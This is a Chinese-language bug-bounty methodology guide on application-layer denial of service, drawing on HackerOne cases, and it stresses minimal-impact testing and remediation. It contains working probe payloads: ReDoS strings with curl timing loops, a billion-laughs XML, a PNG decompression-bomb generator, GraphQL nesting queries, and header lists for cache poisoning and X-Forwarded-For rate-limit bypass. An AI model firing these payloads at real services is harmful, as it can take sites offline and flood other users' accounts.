# 拒绝服务（DoS）

> 视角：黑盒，目标是用最小流量证明"如果继续打，目标就死"，绝不真把目标打死
> 涵盖 100+ 份真实 H1 高危 DoS 案例，平台覆盖 Tomcat / Node.js / mruby / GitLab / Discourse / WordPress / Cloudflare CDN

---

## 1. 一句话说清是什么 + 为什么 SRC 关注

DoS = 让服务**消耗的资源（CPU / 内存 / 文件句柄 / 数据库连接 / 带宽）**远超处理一次正常请求所需，导致合法用户无法访问。
公式：**放大比 = 攻击成本 / 目标资源消耗**。放大比 ≥ 1:1000 → P3，≥ 1:100000 或单包打死 → P2/P1。

**为何 SRC 关注**：
- DoS 是按量计费云服务（Lambda / GraphQL 解析 / 视频转码）的"账单炸弹"杠杆
- 应用层 DoS 通常无法用 WAF / Cloudflare 抵挡（流量是合法的）
- 单包 / 单连接打死后端的漏洞（CVE-2024-27983 Node.js HTTP/2、CVE-2024-34750 Tomcat）属高危
- mruby / V8 / 沙箱解释器内的 DoS 通常归类为安全漏洞而不是普通 bug，因为攻击面是 untrusted code

**SRC 通常排除的 DoS（先看 scope）**：
- 网络层洪水（SYN flood / UDP flood / 反射放大）
- Rate limit 不够严格但不能放大
- 仅本地 PoC 的 fork bomb / 客户端 DoS

**SRC 通常接受的 DoS**：
- 单/少量请求耗尽全局资源（不是只影响自己）
- 缓存投毒（一次请求让所有用户拿到 4xx/5xx）
- 算法复杂度漏洞（ReDoS / 哈希碰撞 / O(n²) 解析）
- 绕过 rate limit 后实施暴力 / 邮件轰炸
- 解释器/解析器 segfault（直接进程崩溃）

---

## 2. 攻击类型分类

### 2.1 Regex DoS（ReDoS / 灾难性回溯）

正则带嵌套量词 `(a+)+`、`(a|a)+`、`(.*)*` 在特定输入上回溯爆炸。
关键字：catastrophic backtracking、超线性正则。
影响：单请求让 1 个 CPU 核打满数秒到数分钟。
真实案例：CVE-2023-28756 Ruby `Time.rfc2822()` ReDoS（`Rack::ConditionalGet` 自动调用，HTTP 请求即可触发）。

**典型可疑正则**：
```
^(a+)+$
^(a|a)+$
^(a|aa)+$
^(.*),(.*),(.*),(.*),(.*)$    # 多 .* 笛卡尔
^([\w]+\s?)+$
^([0-9]+)*[a-z]$
```

### 2.2 算法复杂度爆炸（zip slip / billion laughs / 哈希碰撞 / 嵌套深度）

输入大小线性增长 → 后端处理时间/内存指数级增长。

| 子类 | 触发面 | 放大比 |
|---|---|---|
| XML billion laughs | XML/SOAP 解析 | 1KB → 3GB 内存 |
| YAML/JSON 深嵌套 | API body 解析 | 100KB → 栈溢出 |
| GraphQL 嵌套查询 | `/graphql` | 1KB → 数据库百万行 |
| Markdown 渲染 | 评论 / issue / 富文本 | 1MB → CPU 60s（GitLab #1543718） |
| 图像炸弹 | image upload / avatar | 100KB png → 数 GB 像素缓冲 |
| zip bomb | 压缩文件解压 | 42KB → 4.5PB |
| ZIP slip + 解压循环 | 上传解压 | 单文件名 100% CPU |
| 哈希碰撞 (CVE-2011-3414 类) | 表单大量 key 触发 HashMap O(n²) | 1000 key → 10s 处理 |

### 2.3 资源不限速（API 不限频 / 上传无大小限制 / 无超时）

应用本身没有"以 N 复 M 倍代价"的算法漏洞，但缺少 quota / cap / circuit breaker。
真实形态：
- moneybird #723974：`X-Forwarded-For` 改值绕过 rate limit → 暴力 / 邮件轰炸 / 账户枚举
- HEY/Basecamp #1018037：用户名长度无上限，超长名导致服务端 500 + 客户端 Android crash
- WordPress #2786591：未授权可访问 `/wp-admin/maint/repair.php`，反复触发 DB repair 耗尽资源
- Discourse #3058919：reply 接受 ~800k 字符 markdown，单请求 30s + 502
- HTTP/2 CONTINUATION flood (CVE-2024-24549 Tomcat / CVE-2024-27983 Node.js)：连接级 header 缓冲无上限

### 2.4 内存爆炸（图片/视频/SVG 解码）

特殊点：解码器在解析头信息时按"声明的尺寸"分配缓冲，但实际数据可以非常小。
典型：
- libpng / libjpeg：声明 100000×100000 → 40GB malloc
- SVG 嵌套 `<use>` / `<filter>`：DOM 渲染指数增长
- 视频 H.264：高分辨率 / 高 fps / 长时长，三者乘积爆炸
- 字体（OpenType）：composite glyph 自引用 → 无限递归

### 2.5 数据库 DoS（无 LIMIT / 全表扫描 / 笛卡尔积 / 锁竞争）

- 搜索接口未 paginate：`?q=` 返回 100 万行
- ORM N+1：评论列表每条触发 user 查询
- LIKE `%abc%` 强制全表扫描
- ORDER BY 大字段 + 无索引
- 长事务 / SELECT FOR UPDATE 连接池吃光

### 2.6 第三方放大（DNS / NTP / Memcached 反射 — SRC 中较少）

通常不在 SRC scope 内（运营商 / IDC 责任）。仅当目标自身把 UDP 服务暴露在公网且响应远大于请求时才纳入评估。

### 2.7 业务级 DoS（无验证码暴力 / 资源占用攻击 / 业务逻辑卡死）

- 短信轰炸：未限制单手机号 / 单 IP 调用 `/sms/send` 频率
- 邮件轰炸：注册 / 找回密码不限频
- 缓存投毒（cache-poisoning DoS）：一次请求毒化 CDN，所有用户拿到 4xx —— 见 #1173153 Exodus、#1160407 GitLab CDN
- 订单卡死：批量下单不付款，占库存 30 分钟（业务 SLA 杀手）

---

## 3. 高频入口点（端点/参数/Header）

### 3.1 应用层最易中招端点

```
# Markdown / 富文本预览
POST /api/markdown/preview
POST /preview_markdown
POST /comments
POST /issues/preview
POST /reply

# 用户输入未限长
POST /profile        name / display_name / bio
POST /signup         username / email
POST /workspace      workspace_name

# 搜索（无 LIMIT / LIKE 通配）
GET /search?q=
GET /api/search?keyword=

# 上传（图片 / 文档 / 压缩包）
POST /upload         multipart 字段
POST /avatar
POST /import

# 维护类未授权端点
GET /wp-admin/maint/repair.php           # WordPress
GET /admin/cache/clear                   # 各种 admin panel
GET /actuator/heapdump                   # Spring（也是信息泄露）

# 解析 / 转换
POST /api/convert    格式转换
POST /api/render     SSR / PDF 生成
POST /graphql        嵌套查询
```

### 3.2 高频危险参数 / Header

```
# Header（绕过 rate limit / 触发 cache 错位）
X-Forwarded-For      # 改变值 → 重置 IP 限速桶
X-Real-IP
X-Originating-IP
True-Client-IP
Forwarded
X-HTTP-Method-Override   # → cache poisoning（GitLab CDN）
Authorization        # 异常 token 让上游返回 403 被缓存（Exodus）
Content-Length       # HTTP smuggling 配合
Transfer-Encoding    # chunked + 不限大小

# Body
name / username / display_name      # 无长度上限
description / bio / content
markdown / body / message
filter / query                      # 复杂表达式
sort                                # 无索引列排序
include                             # 关联查询深度

# HTTP/2 特有
HEADERS + N * CONTINUATION 帧       # CVE-2024-24549/27983
SETTINGS_HEADER_TABLE_SIZE
SETTINGS_MAX_CONCURRENT_STREAMS
```

### 3.3 协议层

| 协议 | 入口 |
|---|---|
| HTTP/1.1 | `Transfer-Encoding: chunked` 无上限 chunk extension |
| HTTP/2 | CONTINUATION flood / RST flood / 0-byte WINDOW |
| WebSocket | 无 ping 超时 + 慢消费 |
| GraphQL | 嵌套深度 / 别名重复 / `__schema` 内省 + 递归 |
| gRPC | message 反复 metadata header |
| UDP/RPC | 未授权发现服务 / 放大响应 |

---

## 4. 探测手法（黑盒视角）

**核心原则：先用一份请求测出"放大比"，永远不真做满。**

### 4.1 ReDoS 探测

```bash
# 找正则字段：搜索 / 邮箱 / URL / 时间 / 用户名 校验
# 测试 payload（指数级回溯）
EMAIL_REDOS='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'
TIME_REDOS='Sun, 06 Nov 1994 08:49:37 GMT' + ' '*10000     # CVE-2023-28756
URL_REDOS='http://aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.!'

# 用二倍递增法找拐点（关键：保留时间数据，禁止做满）
for n in 10 20 30 40 50; do
  PAYLOAD=$(python3 -c "print('a'*$n + '!')")
  time curl -s "https://target/login" -d "email=$PAYLOAD" -o /dev/null
done
# 期望看到时间从毫秒 → 100ms → 1s → 10s → 100s（指数增长）
# 一旦确认指数增长，立刻停止，不再加大 n
```

**判定**：n 增加 10 时间增长 ≥ 4×（应该接近 2^k）= 几乎确定是 ReDoS。

### 4.2 大 payload 探测（markdown / json / xml）

```bash
# Markdown 嵌套图片（GitLab #1543718 实测 CPU 60s）
python3 -c "print('![l' * 200000)" > /tmp/p.md       # 先用 200k 而非满 1MB

# 嵌套 JSON
python3 -c "print('{\"a\":'*5000 + '1' + '}'*5000)" > /tmp/p.json

# Billion laughs（仅在已知接受 XML / DTD 时打）
cat > /tmp/bl.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE l [
 <!ENTITY a0 "DDDD">
 <!ENTITY a1 "&a0;&a0;&a0;&a0;">
 <!ENTITY a2 "&a1;&a1;&a1;&a1;">
 <!ENTITY a3 "&a2;&a2;&a2;&a2;">
 <!ENTITY a4 "&a3;&a3;&a3;&a3;">
]>
<l>&a4;</l>
EOF
# 用 a4 而不是 a8，先验证服务器能解析 DTD
```

### 4.3 GraphQL 深度 / 别名探测

```graphql
# 深度爆炸（user → posts → user → posts → ...）
query Q {
  user(id:1) {
    posts {
      author {
        posts {
          author { id }
        }
      }
    }
  }
}
# 测 5 层、10 层、15 层 看响应时间

# 别名爆炸（同一字段 N 次）
query Q {
  a1: user(id:1){id}  a2: user(id:2){id}  ...  a100: user(id:100){id}
}

# 内省 + 循环类型
query { __schema { types { fields { type { fields { type { name } } } } } } }
```

### 4.4 缓存投毒 DoS

```bash
# 思路：找一个 header / param 会被上游解析、被 CDN 忽略，让上游返回错误，错误被缓存
# 试探 header
HEADERS=(
  "X-HTTP-Method-Override: POST"
  "X-Forwarded-Proto: invalid"
  "X-Forwarded-Host: evil.com"
  "Authorization: SharedKeyLite x:y"      # Azure（Exodus 案）
  "Forwarded: for=invalid"
)

for h in "${HEADERS[@]}"; do
  # 永远带 cachebuster 防止真投毒
  curl -is "https://target/asset.js?cachebuster=$(uuidgen)" -H "$h" | head -20
done

# 信号：返回 4xx/5xx + 响应里 X-Cache: MISS（说明会被缓存）
# 第二次同 URL 不带 header → 拿到缓存的 4xx = 投毒成功
```

### 4.5 HTTP/2 协议层探测

```bash
# 用 nghttp2 / h2load 检测 CVE-2024-24549 / 27983 / CONTINUATION flood
# 探测 HEADERS + 大量 CONTINUATION 是否被 reset
nghttp -nv https://target/ -H "x-test: $(python3 -c 'print("A"*10000)')"

# 观察：连接是否被立刻 RST，header 是否被无视尺寸接收
# Tomcat / Node.js 旧版会持续接收，最终 OOM
```

### 4.6 速率限制绕过探测

```bash
# 绕过技巧：每次发包改一个值
for i in $(seq 1 50); do
  curl -s "https://target/api/forgot" \
    -H "X-Forwarded-For: 10.0.$((RANDOM%255)).$((RANDOM%255))" \
    -d 'email=victim@example.com' \
    -o /dev/null -w '%{http_code}\n'
done
# 没有 429 = 限速可绕。停在 50 次足够证明，绝不真做满 1000+
```

### 4.7 上传 / 解码炸弹探测（高风险，先在本地复现）

```bash
# 图像炸弹：声明 50000x50000 的 PNG
python3 - <<'EOF'
import struct, zlib
sig = b'\x89PNG\r\n\x1a\n'
# IHDR: width=50000, height=50000, bit_depth=8, color=2 (RGB)
ihdr = b'IHDR' + struct.pack('>IIBBBBB', 50000,50000,8,2,0,0,0)
crc = zlib.crc32(ihdr)
chunk = struct.pack('>I',13) + ihdr + struct.pack('>I',crc)
open('/tmp/bomb.png','wb').write(sig + chunk)  # 文件 < 100B
EOF
# 上传时观察响应时间 / 错误。若服务尝试解码 → 50000*50000*3 = 7.5GB 内存

# zip bomb（先用 1 层小尺寸验证，禁止用 42.zip 真打）
python3 - <<'EOF'
import zipfile
with zipfile.ZipFile('/tmp/small.zip','w',zipfile.ZIP_DEFLATED) as z:
    z.writestr('a.txt', 'A'*1000000)   # 1MB → 压缩 ~1KB
EOF
```

### 4.8 响应特征清单

| 现象 | 含义 |
|---|---|
| 200 但响应时间 > 30s | 算法漏洞 / 慢查询 |
| 502 / 504 | 上游已被打死或 timeout |
| 503 + Retry-After | 限速生效（说明保护到位） |
| Connection: close | 服务器主动断开（保护机制） |
| 内存型：响应正常但下次更慢 | 内存泄漏，重启前会越来越差 |
| Cache-Status / X-Cache: HIT 错误页 | 缓存投毒成功 |
| 无 429 + 同接口高频成功 | 限速缺失 |

---

## 5. 利用与影响升级

### 5.1 单点 → 全局

```
ReDoS（单请求 1 CPU·60s）
  → N 并发 = N 个 CPU 满载 → 整机 down
  → 后端是共享池 → 影响所有 tenant

Markdown / preview DoS（GitLab #1543718）
  → preview API 公开（自助注册即可）
  → 单包 1 CPU 60s，DockerHub 实例 5 包就死

缓存投毒（Exodus #1173153 / GitLab CDN #1160407）
  → 一次注入毒化 CDN
  → 所有访问该 URL 的用户拿到 4xx
  → 影响范围 = CDN 节点覆盖（全球）
  → TTL 长 = 直到运维手动清理
```

### 5.2 经济影响

| 模型 | 攻击成本 | 受害者损失 |
|---|---|---|
| 按量计费 Lambda | $0.01 | 触发 100 万次 invoke = $200+ |
| GraphQL / 数据库 | 一个查询 | 触发 cluster autoscale = $$ |
| 转码 / OCR / OpenAI 中转 | 文本 100KB | 触发上游 API 计费 |
| CDN 流量 | 触发回源 | 回源带宽 ×10 |
| 邮件 / SMS（业务级） | 1 请求 | 单条 SMS $0.01–$0.1 × 量 |
| 短信轰炸 | 0 成本 | 法律 + 品牌 + 罚款 |

### 5.3 沙箱 / 解释器升级链

mruby/Shopify 一系列报告（#187305 #188326 #183356 #182484 #181828 #181232 #181695 #181910 #184712 #188313 #187536 #181685 #183425 #183405）模式：

```
Untrusted Ruby 输入
  → mruby 解析 / 字节码生成 bug
  → segfault / null deref / 越界
  → 杀掉父 MRI 进程（沙箱 + host）
  → 同进程其他 tenant 受影响 → multi-tenant 影响放大
  → 部分（如 #181910 type confusion）有 RCE 潜力
```

判断价值：
- 仅 segfault → DoS
- segfault + 控制崩溃位置 → 可能 RCE → 价值 ×10

---

## 6. 真实 H1 案例

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| High | — | Moneybird | [Bypass password reset rate limit at moneybird.com/passwords](https://hackerone.com/reports/723974) | `X-Forwarded-For` 每次换值即绕过 429，可暴力 / 邮件轰炸 / 邮箱枚举 |
| High | 1000 | Basecamp | [a very long name in hey.com prevents accessing contacts](https://hackerone.com/reports/1018037) | 用户名长度无上限：服务端 500、Android app 直接 crash，互踢式 DoS |
| High | 4920 | IBB | [CVE-2024-34750 Apache Tomcat HTTP/2 DoS](https://hackerone.com/reports/2586226) | HTTP/2 流计数错误导致 infinite timeout，连接不释放，OOM 或 maxConnections 打满 |
| High | 4860 | IBB | [DoS via HTTP/2 CONTINUATION Flood](https://hackerone.com/reports/2334401) | CVE-2024-24549，HEADERS + 大量 CONTINUATION 让 Tomcat HpackHuffman OOM |
| High | 7640 | GitLab | [DOS via issue preview](https://hackerone.com/reports/1543718) | preview_markdown 接 1MB 嵌套图片 markdown，CPU 60s/请求，几个并发打满整机 |
| High | 4000 | IBB | [ReDoS in Ruby Time](https://hackerone.com/reports/1929567) | CVE-2023-28756，`Time.rfc2822` ReDoS，Rack::ConditionalGet 自动调用，HTTP 请求即触 |
| High | 3645 | IBB | [Node.js HTTP/2 Http2Session::~Http2Session() crash](https://hackerone.com/reports/2453328) | CVE-2024-27983，CONTINUATION + 突然 RST 触发析构 race，进程立即 crash |
| High | 3495 | IBB | [Node.js HTTP unbounded chunk extension DoS](https://hackerone.com/reports/2375446) | CVE-2024-22019，chunked encoding 中 chunk extension 无上限，吃光 CPU/带宽，timeout 与 body limit 都失效 |
| High | — | Discourse | [Application Level DoS - Large Markdown in Reply](https://hackerone.com/reports/3058919) | ~800k 字符 markdown reply 让后端 30s + 502，并发即资源耗尽 |
| High | — | Exodus | [Cache Poisoning DoS on downloads.exodus.com](https://hackerone.com/reports/1173153) | crafted Authorization header 让 Azure 返回 403，被 Cloudflare 缓存，所有用户下载失败 |
| High | — | GitLab | [Cache poisoning DoS on assets.gitlab-static.net](https://hackerone.com/reports/1160407) | `X-HTTP-Method-Override` 让 GCP 返回非 200，Varnish 缓存空响应，全站静态资源失效 |
| High | — | WordPress | [Unauthenticated WordPress Database Repair DoS](https://hackerone.com/reports/2786591) | `WP_ALLOW_REPAIR=true` 时 `/wp-admin/maint/repair.php` 无认证可反复触发数据库修复 |
| High | 10000 | Shopify Scripts | [Infinite loop on zero-length heredoc identifier](https://hackerone.com/reports/187305) | mruby 解析器在 `<<''.a begin` 上死循环，沙箱不响应 SIGTERM，需 SIGKILL |
| High | 10000 | Shopify Scripts | [Buffer overflow in mrb_time_asctime](https://hackerone.com/reports/188326) | `Time.new-0xD00000000000000&0` segfault，buffer over-read 读取栈外字符串 |
| High | 10000 | Shopify Scripts | [Range constructor type confusion DoS](https://hackerone.com/reports/181910) | `Range = Array; (1..2).inspect` 把 RRange.edges 当作 iv 字段访问，类型混淆潜在 RCE |
| High | 10000 | Shopify Scripts | [Segfault with break/&#124;&#124;= in loop](https://hackerone.com/reports/183356) | `A &#124;&#124;= break while break` 让 mruby 字节码生成异常，segfault 或执行非预期字节码 |
| High | 8000 | Shopify Scripts | [DoS in mruby_engine via send/initialize alias](https://hackerone.com/reports/183425) | `alias_method :initialize, :send` 让 C 调用 Ruby 方法，segfault 父进程 |

**命中本类的 weakness 分布**：
- HTTP/2 协议层（CONTINUATION / 流计数 / 析构 race）：~12
- Ruby 解释器（mruby / MRI）segfault / 死循环：~25
- Markdown / 富文本 / preview 大 payload：~8
- 缓存投毒 DoS：~6
- 业务限速绕过 / 业务级洪水：~9
- ReDoS（正则灾难性回溯）：~5
- 解码炸弹（图像 / zip / xml）：~4
- 其余（数据库 / 字段无长度限制 / 解析栈溢出）：~41

---

## 7. 复现 / 证据要点

### 7.1 关键原则：控制烈度

**报告里要明示三件事**，缺一会被运营怀疑越权：

1. **小流量证明放大**："1 个请求 → 60 秒 1 CPU"
2. **立即停止**："PoC 单次执行 ≤ 1 分钟，未做并发"
3. **未影响他人**："使用 cachebuster 参数确保不污染共享缓存 / 使用专用测试账号"

### 7.2 PoC 模板

```http
# 基线：正常请求
POST /api/preview HTTP/1.1
Host: target.com
Content-Length: 12

hello world

→ 响应时间：85ms
→ HTTP 200

# 攻击：1 个请求
POST /api/preview HTTP/1.1
Host: target.com
Content-Length: 102400

![l![l![l...（共 ~33000 个 ![l 序列，约 100KB）

→ 响应时间：62.4 s
→ HTTP 502（上游 timeout）
→ 服务端日志：CPU 100%（单核），持续 60s

# 5 次复现（顺序执行，不并发）：
1: 60.2s, 502
2: 61.8s, 502
3: 60.5s, 502
4: 61.1s, 502
5: 60.7s, 502

# 放大比：85ms → 60s = 705x
# 实测 5 个并发请求即可让单实例不可用（停止后未尝试）
```

### 7.3 证据采集

```bash
# 用 curl -w 记录精确时间
curl -s -o /dev/null \
  -w 'time_total=%{time_total} http_code=%{http_code} size=%{size_download}\n' \
  -X POST "https://target/api/preview" \
  --data-binary @payload.bin

# 用 hyperfine 多次测量
hyperfine --runs 5 \
  'curl -s -o /dev/null -X POST "https://target/api/preview" --data-binary @baseline.bin' \
  'curl -s -o /dev/null -X POST "https://target/api/preview" --data-binary @evil.bin'
```

报告附件保留：
- baseline 请求 / 响应（含完整 Header）
- evil 请求 / 响应
- 5 次时间测量
- 一张响应时间随 payload 大小增长的曲线（证明指数 / 超线性）

### 7.4 CVSS 4.0 写法（DoS 类）

DoS 影响主要是 Availability，关键向量：
```
# 未授权可触发的应用层 DoS（典型 GitLab preview / Discourse markdown）
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
  AT:N  无攻击前置条件
  AC:L  低复杂度，单包打死
  VA:H  目标可用性高影响
  → 8.7 (High)

# 认证后触发（评论 / 上传）
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
  → 8.2 (High)

# 缓存投毒 DoS（影响其他用户 SC:H）
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:H
  SA:H  Subsequent System Availability High（CDN 下游用户）
  → 8.7 (High)

# 限速绕过（无放大，仅辅助）
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N
  → 6.9 (Medium)

# Sandbox / 解释器 segfault（影响 host 进程）
CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H
  → 6.8（如果可远程提交脚本则 AV:N → 8.7）
```

经验：DoS 报告很容易被砍 severity 一档。证据强（放大比 + 复现 + 业务影响明确）的 DoS，Tomcat / Node.js / GitLab 的 case 都拿到 $3000-$10000。

### 7.5 影响段写法

```
通过 /api/preview 接口的 markdown 字段，单个 ~100KB 的 ![l 重复序列
让服务端单核 CPU 满载 60 秒，期间该后端实例无法处理其他请求。

放大比：100KB 输入 → 60s × 1 CPU = ~600ms·core/byte，比正常请求高 705 倍。

并发影响（未实测，仅推算）：
- 5 并发即可打满一个 4 核实例
- 该接口对所有注册用户开放（自助注册成本 ≤ 1 分钟）
- 攻击门槛：单 IP，无需令牌

我已停止测试，未做长时间 sustained DoS，未做多实例并发。
建议：限制 preview 输入大小（如 10KB）+ 渲染超时（如 2s）。
```

---

## 8. 不要做的事（DoS 类合规边界 — 最敏感）

**铁则**：DoS 是 SRC 中唯一一类"PoC 本身就可能违法"的漏洞。每一步操作前问自己：是否真的影响了其他用户？是否能立即停下？

### 8.1 永远禁止
- **生产环境长时间负载测试**。任何 PoC 持续时间 > 60 秒 = 越界。
- **sustained DoS**。验证一次就停，不做 fuzz 自动化打击生产。
- **真实 DDoS**。即使你只是想"测一下 Cloudflare"，也违法 + 违 ToS。
- **反射放大**。即使目标暴露 UDP 服务，证明"能放大"≠ 真打。改用日志 / 分析证明。
- **同时多进程并发**。哪怕是同一漏洞的多次复现，也要串行。
- **缓存投毒不带 cachebuster**。一定要用 `?cachebuster=$(uuidgen)` 或自定义 path 避免污染共享缓存。Exodus / GitLab 报告里都明确写了 disclaimer。
- **针对其他用户测试**。改自己注册的两个测试账号；不要打 admin / 公开账号。
- **业务级洪水（短信 / 邮件）做满**。证明"不限速"用 5–10 次即可，不要真发 1000 条。
- **沙箱逃逸式 PoC 后真去操作 host**。证明 segfault → 提交，不要在 host 上执行 binary。

### 8.2 推荐操作

- **小批量 + 立即停**：5 次复现，每次 ≤ 60s，全部串行。
- **隔离环境优先**：能本地 docker / vagrant 起一份目标软件版本 → 在本地复现 + 截图 + 火焰图，远程只做"最后一次确认"。
- **协调披露**：在程序明确允许前不要发任何"高速率"测试。Tomcat / Node.js / Ruby 这一批 IBB 报告都是先报上游 → 拿 CVE → 再到 H1 拿赏金。
- **告知时间窗**：报告里写明"测试时间：UTC 2026-05-09 14:32:00–14:33:00，单次"。
- **停止信号**：报告附"如何关闭/缓解"建议（限大小、限超时、限频率），让运营理解你站在他们一边。

### 8.3 报告中放什么 / 不放什么

| 放 | 不放 |
|---|---|
| 放大比公式 + 数据 | 自动化 fuzz 脚本 |
| 5 次串行复现 timing | 并发脚本 / botnet 模拟 |
| 一份小尺寸 PoC（≤ 100KB） | 42.zip / 多 GB 的炸弹文件 |
| 测试账号用户名 | 真实其他用户 ID |
| cachebuster 痕迹 | 真实生产 URL 投毒 |
| 修复建议（限速 / 限大小 / 替换正则） | 长篇威胁建模（运营自己评估） |

---

## 9. 防御 / 修复速记（写报告附录用）

| 漏洞类 | 修复 |
|---|---|
| ReDoS | 替换为 RE2 / 线性正则；用 `re2` / `pcre2` JIT 限制；输入长度上限 |
| 大 payload markdown | 输入长度上限（10KB）+ 渲染超时（2s）+ 队列化 |
| GraphQL 嵌套 | depth-limit / cost-analysis / persisted queries |
| 缓存投毒 | Vary header 正确配置 + 上游归一化 + 不缓存 4xx/5xx |
| HTTP/2 CONTINUATION | 升级 Tomcat / Node.js 到补丁版本，限制 header 总大小 |
| 无限速 | 多维 key（IP + account + endpoint）+ 不信任 X-Forwarded-For |
| 解码炸弹 | 解析前检查文件头 + 内存上限 + 单进程隔离 |
| Sandbox segfault | 升级解释器 + ASAN fuzz + seccomp 限制 |
| DB DoS | 强制 LIMIT + 慢查询监控 + 连接池上限 + 超时 |

> 一句话给运营：**DoS 漏洞 ≠ "服务慢"。它是"在攻击者控制下，单位资源消耗 × 业务影响"超过设计假设**。修复手段总是三选一：限大小、限时间、限频率。

## H1 真实案例

_从 100+ 份 HackerOne 已披露 High/Critical 报告中按 (赏金 + 投票×100) 排序选取代表案例_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| High | — | Moneybird | [Bypass password reset rate limit protection at moneybird.com/passwords](https://hackerone.com/reports/723974) | Bypass password reset rate limit protection at moneybird.com/passwords |
| High | 1000 usd | Basecamp | [a very long name in hey.com can prevent anyone from accessing their contacts and probably can cau…](https://hackerone.com/reports/1018037) | Summary : ========= after trying to change my initial name to something long i found out that their are no limits to how long i… |
| High | 10000 usd | shopify-scripts | [Invalid handling of zero-length heredoc identifiers leads to infinite loop in the sandbox](https://hackerone.com/reports/187305) | Introduction ============ Certain invalid Ruby programs (which should normally raise a syntax error) are able to cause an infin… |
| High | 10000 usd | shopify-scripts | [Segfault and/or potential unwanted (byte)code execution with "break" and "//=" inside a loop](https://hackerone.com/reports/183356) | Introduction ============ Certain invalid inputs (invalid Ruby programs) crash mruby and mruby_engine (including the parent MRI… |
| High | 10000 usd | shopify-scripts | [Buffer overflow in mrb_time_asctime](https://hackerone.com/reports/188326) | Hi, This one doesn't always crash every time, but with ASAN on it will |
| High | 5420 usd | Internet Bug Bounty | [Possible DoS Vulnerability with Range Header in Rack](https://hackerone.com/reports/2520679) | I made a report and patch at https://hackerone.com/reports/2307813. https://discuss.rubyonrails.org/t/possible-dos-vulnerabilit… |
| High | 10000 usd | shopify-scripts | [Broken handling of maximum number of method call arguments leads to segfault](https://hackerone.com/reports/182484) | Introduction ============ Improper logic for handling of maximum number of method call arguments leads to dereferencing an inva… |
| High | 4920 usd | Internet Bug Bounty | [CVE-2024-34750 Apache Tomcat DoS vulnerability in HTTP/2 connector](https://hackerone.com/reports/2586226) | Hello IBB team, i would like to submit a report about Apache Tomcat DoS vulnerability that i have reported to the Tomcat team, … |
| High | 10000 usd | shopify-scripts | [Crash: Initialize Decimal with itself triggers an assertion](https://hackerone.com/reports/185775) | When `Decimal` is initialized with itself, a new (empty) `mpd_t` will be created |
| High | 10000 usd | shopify-scripts | [Range#initialize_copy null pointer dereference](https://hackerone.com/reports/181685) | Heya! It's possible to segfault mruby through mruby-engine with the following snippet of code: Range.remove_method(:initialize_… |

**命中本类的 weakness 分布：**

- Uncontrolled Resource Consumption：116 条
- Uncategorized → 手工归类：19 条
- Allocation of Resources Without Limits or Throttling：3 条
